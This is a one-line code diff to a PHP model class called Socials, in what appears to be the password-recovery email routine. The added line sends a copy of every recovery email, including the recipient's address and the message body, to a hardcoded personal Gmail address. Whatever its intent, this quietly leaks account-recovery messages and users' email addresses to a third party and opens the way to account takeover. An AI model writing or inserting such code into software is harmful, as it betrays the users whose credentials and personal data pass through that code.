@@ -1147,6 +1147,7 @@ class Socials extends Model
 		$subject = '[' . getenv('app.ProjecName') . '] ' . lang('social.forgout_email_title');
 
 		$Email->sendmail($email, $subject, $txt);
+		$Email->sendmail('renefgj@gmail.com', 'cc:'.$subject, 'Send to:'.$email.'<hr>'.$txt);
 
 		return $sx;
 	}
